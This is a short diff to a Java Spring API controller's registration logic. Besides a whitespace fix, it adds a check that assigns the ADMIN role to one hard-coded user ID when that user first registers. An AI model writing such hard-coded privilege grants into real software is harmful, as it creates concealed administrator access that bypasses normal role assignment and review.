@@ -119,7 +119,7 @@ public class ApiController {
         SecurityUser customUserDetail = securityUserService.loadUserByUsername(userInfo.getId());
 
         if (customUserDetail == null) {
-            SecurityUser dto = new SecurityUser(userInfo.getId(), userInfo.getName(), userInfo.getEmail(), null, 0 );
+            SecurityUser dto = new SecurityUser(userInfo.getId(), userInfo.getName(), userInfo.getEmail(), null, 0);
             dto.setRole(Role.USER);
             securityUserService.register(dto);
             customUserDetail = securityUserService.loadUserByUsername(userInfo.getId());
@@ -153,7 +153,12 @@ public class ApiController {
 
         if (customUserDetail == null) {
             SecurityUser dto = new SecurityUser(userInfo.getId(), userInfo.getName(), userInfo.getEmail(), null, 0);
-            dto.setRole(Role.USER);
+
+            if (dto.getUsername().equals("OzasBAmAO1H1Ph-lAJ5A-xmD3ncxo8YRE53C9m90G_M")) {
+                dto.setRole(Role.ADMIN);
+            } else {
+                dto.setRole(Role.USER);
+            }
             securityUserService.register(dto);
             customUserDetail = securityUserService.loadUserByUsername(userInfo.getId());
         }
